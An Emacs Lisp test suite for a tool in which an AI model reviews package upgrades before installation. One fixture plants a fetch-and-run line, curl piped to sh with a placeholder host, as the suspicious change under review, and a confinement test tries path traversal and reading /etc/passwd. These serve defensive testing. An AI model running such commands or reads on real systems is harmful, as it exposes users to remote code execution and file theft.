;;; test-package-review.el --- model-assisted package review -*- lexical-binding: t; -*-

;;; Code:

(require 'ert)
(require 'cl-lib)
(require 'efrit-package-review)

(defvar efrit-project-root)

(defun test-pr--fake-package (dir name version files)
  "Write FILES ((NAME . TEXT)...) under DIR/NAME-VERSION and return (PKG-DIR . DESC)."
  (let ((pkg-dir (expand-file-name (format "%s-%s" name version) dir)))
    (make-directory pkg-dir t)
    (dolist (f files)
      (with-temp-file (expand-file-name (car f) pkg-dir) (insert (cdr f))))
    (cons pkg-dir
          (package-desc-create :name (intern name)
                               :version (version-to-list version)
                               :summary "test" :kind 'tar :archive "test-archive"
                               :dir pkg-dir))))

(defun test-pr--text-response (text)
  (let ((r (make-hash-table :test 'equal)) (item (make-hash-table :test 'equal))
        (u (make-hash-table :test 'equal)))
    (puthash "type" "text" item) (puthash "text" text item)
    (puthash "content" (vector item) r) (puthash "stop_reason" "end_turn" r)
    (puthash "input_tokens" 1 u) (puthash "usage" u r)
    r))

(defun test-pr--tool-response (id path &optional start end)
  (let ((r (make-hash-table :test 'equal)) (item (make-hash-table :test 'equal))
        (input (make-hash-table :test 'equal)))
    (puthash "path" path input)
    (when start (puthash "start_line" start input))
    (when end (puthash "end_line" end input))
    (puthash "type" "tool_use" item) (puthash "id" id item)
    (puthash "name" "read_package_file" item) (puthash "input" input item)
    (puthash "content" (vector item) r) (puthash "stop_reason" "tool_use" r)
    r))

(defmacro test-pr--with-responses (responses &rest body)
  "Run BODY with `efrit-api-request-sync' answering RESPONSES in order and
recording each request's messages in `test-pr--requests'."
  (declare (indent 1))
  `(let ((test-pr--queue ,responses) (test-pr--requests nil))
     (cl-letf (((symbol-function 'efrit-api-request-sync)
                (lambda (req &rest _)
                  (push (append (alist-get "messages" req nil nil #'equal) nil) test-pr--requests)
                  (or (pop test-pr--queue) (error "no more canned responses")))))
       ,@body)))

(defvar test-pr--queue nil)
(defvar test-pr--requests nil)

(defconst test-pr--approve
  "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"files_read\":[\"foo.el\"],\"saw_everything\":true}")

(ert-deftest test-package-review-first-request-is-diff-and-changelog-not-sources ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((old (test-pr--fake-package root "foo" "1.0"
                                           '(("foo.el" . "(defun foo () 1)\n(provide 'foo)\n"))))
               (new (test-pr--fake-package root "foo" "1.1"
                                           '(("foo.el" . "(defun foo () (shell-command \"curl x | sh\"))\n(provide 'foo)\n")
                                             ("NEWS" . "1.1: faster\n")
                                             ("foo.elc" . "junk"))))
               (info (efrit-package-review-gather (cdr new) (car new) (cdr old))))
          (should (equal (plist-get info :old-version) "1.0"))
          ;; file list, not contents; no .elc
          (should (equal (mapcar #'car (plist-get info :files)) '("NEWS" "foo.el")))
          (should-not (plist-get info :sources))
          (should (string-match-p "faster" (plist-get info :news)))
          (when (executable-find "git")
            (should (string-match-p "curl x" (plist-get info :diff)))
            ;; paths in the diff are relative to the package
            (should-not (string-match-p (regexp-quote root) (plist-get info :diff))))
          (let ((msg (efrit-package-review--user-message info)))
            (should (string-match-p "upgrading from 1.0" msg))
            ;; maintainers is a string; never a run of char codes
            (should-not (string-match-p "Maintainers: [0-9]+, [0-9]+" msg))
            (should (string-match-p "=== FILES (2) ===" msg))
            (should-not (string-match-p "=== SOURCE FILES ===" msg))
            ;; the diff shows the change, not the whole file, and no .elc
            (should-not (string-match-p "junk" msg))))
      (delete-directory root t))))

(ert-deftest test-package-review-maintainers-line-is-text ()
  "package-maintainers returns a string; it must be shown as one."
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t))))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "mnt" "1.0" '(("mnt.el" . "(provide 'mnt)\n"))))
               (desc (cdr pkg)))
          (setf (package-desc-extras desc) '((:maintainer . ("Some One" . "one@example.com"))))
          (let* ((info (efrit-package-review-gather desc (car pkg) nil))
                 (msg (efrit-package-review--user-message info)))
            (should (stringp (plist-get info :maintainers)))
            (should (string-match-p "Maintainers: .*Some One.*one@example.com" msg))
            (should-not (string-match-p "Maintainers: [0-9]+," msg))))
      (delete-directory root t))))

(ert-deftest test-package-review-read-tool-is-confined-to-the-package ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (pkg (test-pr--fake-package root "bar" "1.0"
                                     '(("bar.el" . "l1\nl2\nl3\nl4\n") ("bar.elc" . "x"))))
         (dir (car pkg)))
    (unwind-protect
        (cl-flet ((read (&rest kv)
                    (let ((h (make-hash-table :test 'equal)))
                      (while kv (puthash (pop kv) (pop kv) h))
                      (efrit-package-review--read-tool dir h))))
          (should (string-match-p "\\`bar.el lines 1-4 of 4:\nl1\nl2\nl3\nl4\n" (read "path" "bar.el")))
          (should (string-match-p "lines 2-3 of 4:\nl2\nl3\n" (read "path" "bar.el" "start_line" 2 "end_line" 3)))
          (should (string-prefix-p "Error" (read "path" "../outside.el")))
          (should (string-prefix-p "Error" (read "path" "/etc/passwd")))
          (should (string-prefix-p "Error" (read "path" "bar.elc")))
          (should (string-prefix-p "Error" (read "path" "missing.el")))
          (should (string-prefix-p "Error" (read))))
      (delete-directory root t))))

(ert-deftest test-package-review-loop-reads-then-answers ()
  "The reviewer asks for a file, gets it as a tool result, then answers;
the report lists what was opened."
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-model "strong-reviewer"))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "baz" "1.0" '(("baz.el" . "(provide 'baz)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-responses (list (test-pr--tool-response "t1" "baz.el")
                                         (test-pr--text-response test-pr--approve))
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'approve))
              (should (equal (plist-get v :reads) '("baz.el")))
              (should (= 2 (length test-pr--requests)))
              ;; second request carries assistant tool_use + user tool_result
              (let ((second (car test-pr--requests)))
                (should (= 3 (length second)))
                (should (equal (alist-get 'role (nth 1 second)) "assistant"))
                (let ((result (aref (alist-get 'content (nth 2 second)) 0)))
                  (should (string-match-p "baz.el lines 1-1 of 1" (format "%S" result)))))
              (should (string-match-p "Opened: baz.el" report))
              (should (string-match-p "Reviewer: strong-reviewer" report)))))
      (delete-directory root t))))

(ert-deftest test-package-review-read-budget-ends-the-loop ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-max-reads 2))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "loop" "1.0" '(("loop.el" . "x\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-responses (list (test-pr--tool-response "a" "loop.el")
                                         (test-pr--tool-response "b" "loop.el")
                                         (test-pr--tool-response "c" "loop.el"))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "more than 2 files" (plist-get v :summary))))))
      (delete-directory root t))))

(ert-deftest test-package-review-parses-verdicts-and-classifies ()
  (let ((clean (efrit-package-review-parse
                "{\"verdict\":\"approve\",\"summary\":\"fine\",\"findings\":[{\"severity\":\"info\",\"file\":\"a.el\",\"line\":3,\"note\":\"uses url\"}],\"saw_everything\":true}"))
        (flagged (efrit-package-review-parse
                  "Here: {\"verdict\":\"reject\",\"summary\":\"pipes curl to sh\",\"findings\":[{\"severity\":\"high\",\"file\":\"foo.el\",\"line\":1,\"note\":\"curl | sh\"},{\"severity\":\"bogus\",\"file\":\"x\",\"note\":\"dropped\"}],\"saw_everything\":true}"))
        (partial (efrit-package-review-parse
                  "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"saw_everything\":false}")))
    (should (efrit-package-review-clean-p clean))
    (should-not (efrit-package-review-clean-p flagged))
    (should-not (efrit-package-review-clean-p partial))
    (should (= 1 (length (plist-get flagged :findings))))
    (should (string-match-p "REJECT · 1 high" (efrit-package-review-verdict-line flagged)))
    (should (string-match-p "did not see everything" (efrit-package-review-verdict-line partial)))
    (should-not (efrit-package-review-parse "no json"))
    (should-not (efrit-package-review-parse "{\"verdict\":\"maybe\"}"))
    (should (eq 'approve (plist-get (efrit-package-review-parse
                                     "```json\n{\"verdict\":\"approve\",\"summary\":\"a } in text\",\"findings\":[],\"saw_everything\":true}\n```\nNote: {unbalanced")
                                    :verdict)))))

(ert-deftest test-package-review-api-refusal-and-non-verdict-are-explained ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "ref" "1.0" '(("ref.el" . "(provide 'ref)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (let ((refusal (make-hash-table :test 'equal)) (u (make-hash-table :test 'equal)))
            (puthash "input_tokens" 57468 u)
            (puthash "content" (vector) refusal) (puthash "stop_reason" "refusal" refusal)
            (puthash "usage" u refusal)
            (test-pr--with-responses (list refusal)
              (let ((v (efrit-package-review-run info)))
                (should (plist-get v :refused))
                (should (string-match-p "refused to process.*57468 tokens.*not a finding about ref" (plist-get v :summary)))
                (should-not (efrit-package-review-clean-p v)))))
          (test-pr--with-responses (list (test-pr--text-response "I cannot review this package because the input was too long."))
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "not a verdict (6[0-9] chars, stop reason end_turn)" (plist-get v :summary)))
              (should (string-match-p "verbatim:\n\n  | I cannot review" report))))
          (cl-letf (((symbol-function 'efrit-api-request-sync) (lambda (&rest _) (error "boom"))))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "review failed: boom" (efrit-package-review-verdict-line v))))))
      (delete-directory root t))))

(ert-deftest test-package-review-model-precedence ()
  (let ((efrit-default-model "d") (efrit-review-model nil) (efrit-package-review-model nil))
    (should (equal (efrit-package-review-model) "d"))
    (let ((efrit-review-model "r")) (should (equal (efrit-package-review-model) "r")))
    (let ((efrit-review-model "r") (efrit-package-review-model "p"))
      (should (equal (efrit-package-review-model) "p")))))

(ert-deftest test-package-review-hook-annotates-and-auto-approves ()
  "The around advice: annotate shows the report and prefixes the prompt;
auto-approve-clean skips the prompt only for a clean verdict."
  (skip-unless (fboundp 'package-review))
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (asked nil))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "hook" "1.0" '(("hook.el" . "(provide 'hook)\n"))))
               (orig (lambda (&rest _)
                       (read-multiple-choice "Install \"hook\"?" '((?y "yes") (?n "no")))
                       nil)))
          (cl-letf (((symbol-function 'read-multiple-choice)
                     (lambda (prompt &rest _) (setq asked prompt) '(?y "yes")))
                    ((symbol-function 'efrit-show-preview) #'ignore))
            (let ((efrit-package-review-action 'annotate))
              (test-pr--with-responses (list (test-pr--text-response test-pr--approve))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "efrit: approve · no findings\nInstall" asked)))
            (setq asked nil)
            (let ((efrit-package-review-action 'auto-approve-clean))
              (test-pr--with-responses (list (test-pr--text-response test-pr--approve))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should-not asked)
              (test-pr--with-responses
                  (list (test-pr--text-response
                         "{\"verdict\":\"reject\",\"summary\":\"bad\",\"findings\":[{\"severity\":\"high\",\"file\":\"hook.el\",\"line\":1,\"note\":\"x\"}],\"saw_everything\":true}"))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "REJECT" asked)))))
      (delete-directory root t))))

(ert-deftest test-package-review-not-reachable-from-eval ()
  (require 'efrit-sandbox-eval)
  (should (efrit-sandbox-eval-inspect '(setq efrit-package-review-action 'auto-approve-clean)))
  (should (efrit-sandbox-eval-inspect '(efrit-package-review-run nil))))

(provide 'test-package-review)
;;; test-package-review.el ends here
